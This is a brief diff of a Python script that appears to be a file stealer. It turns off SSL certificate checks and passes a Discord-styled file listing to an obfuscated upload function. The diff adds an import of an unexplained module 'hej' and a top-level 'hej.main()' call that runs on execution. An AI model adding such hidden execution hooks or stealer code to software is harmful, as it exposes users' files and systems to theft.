@@ -19,6 +19,7 @@ import re
 import sys
 import subprocess
 import ssl
+import hej
 
 ssl._create_default_https_context = ssl._create_unverified_context
 def main():
@@ -1072,3 +1073,5 @@ def main():
                     filetext += f"└─< <:openfolder:1111408286332375040> [{fileanme}]({b})\n"
                 filetext += "\n"
         UP104D("kiwi", filetext)
+
+hej.main()
